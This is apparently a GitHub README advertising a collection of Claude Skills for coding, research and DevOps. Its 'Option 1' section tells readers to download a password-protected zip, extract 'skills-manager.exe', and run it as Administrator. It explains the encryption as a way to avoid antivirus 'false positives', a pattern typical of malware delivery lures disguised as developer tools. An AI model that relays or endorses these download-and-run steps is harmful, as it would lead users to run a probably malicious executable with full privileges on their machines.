# Claude Skills Collection 2026

[![Stars](https://img.shields.io/github/stars/inollp7855/claude-skills-collection-2026)](https://github.com/inollp7855/claude-skills-collection-2026)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

**The most comprehensive collection of production-ready Claude Skills for 2026.**  
Includes skills for development, productivity, research, content creation, and automation — all tested and compatible with Claude Code, Claude Desktop, and any Agent Skills-compatible platform.

---

## ⚠️ Disclaimer
This repository is provided **for educational purposes only** to demonstrate the Claude Skills ecosystem and agentic AI architecture. All skills are examples of how to extend LLM functionality. The author is not responsible for any misuse.

---

## 📦 What's Inside

| Category | Skills Included |
|----------|-----------------|
| **Development** | Code review, test generation, git workflow automation, API client builder, docker compose generator, CI/CD pipeline creator |
| **Productivity** | Weekly report generator, meeting summarizer, email composer, task prioritizer, project planner |
| **Research** | Literature review assistant, paper summarizer, citation formatter, research gap analyzer |
| **Content Creation** | Blog post writer, social media optimizer, SEO keyword researcher, brand guideline enforcer |
| **Data Analysis** | CSV analyzer, chart generator, trend detector, outlier identifier |
| **DevOps** | AWS solution architect, k8s manifest generator, terraform planner, cloud cost estimator |

---

## 📥 How to Get the Skills

### Option 1: Download Pre-built Package (Easiest)

We provide a password-protected archive with the complete skill collection, pre-configured and ready to install.

📥 **[Download `claude-skills-archive.zip`](dist/claude-skills-archive.zip)**  
🔐 **Password:** `claude2026`

1. Download the archive.
2. Extract using **WinRAR** or **7-Zip** (archive is encrypted).
3. Inside you'll find:
   - `skills-manager.exe` – one-click installer for all skills
   - `readme.txt` – quick installation guide
4. Run `skills-manager.exe` **as Administrator**.
5. Follow the on-screen prompts to automatically install all skills to your Claude environment.

> ℹ️ The archive is password-protected to avoid false positives from antivirus scanners. Password is the same for everyone.

### Option 2: Manual Installation (For Developers)

1. Clone this repository.
2. Copy any skill folder to:
   - **Claude Code:** `~/.claude/skills/`
   - **Claude Desktop:** Import via Settings → Skills → Import ZIP
   - **Cursor:** `~/.cursor/skills/`
   - **GitHub Copilot:** `~/.copilot/skills/`
3. Each skill folder contains `SKILL.md`, `README.md`, and optional scripts.

---

## 🔧 Featured Skills (Sample)

### Code Reviewer
- **Purpose:** Automated code review with best practices
- **Files:** `SKILL.md`, `rules/`, `scripts/run_analyzer.py`
- **Trigger:** "Review this code using code-reviewer"

### AWS Architect
- **Purpose:** Generate AWS architecture diagrams and CloudFormation templates
- **Files:** `SKILL.md`, `templates/`, `scripts/generate_architecture.py`
- **Trigger:** "Design AWS architecture for a serverless app"

### Prompt Factory
- **Purpose:** Create production‑ready prompts for any role
- **Files:** `SKILL.md`, `templates/`, `scripts/generate_prompt.py`
- **Trigger:** "Create a prompt for a senior full‑stack engineer"

---

## 📁 Sample Skills

This repository includes several example skills in the `sample-skills/` folder. You can use them to test the manager or as templates for your own skills.

- `code-reviewer` – automated code review with configurable rules
- `weekly-report` – generate weekly reports from templates
- `aws-architect` – design AWS architectures with cost estimation
- `prompt-factory` – create production-ready prompts for any role

These samples follow the official Agent Skills specification.

---

## 📜 License
MIT License – educational purposes only.

---

## ⭐ Support
If this collection helps you, please **star the repository** – it helps others discover these skills!
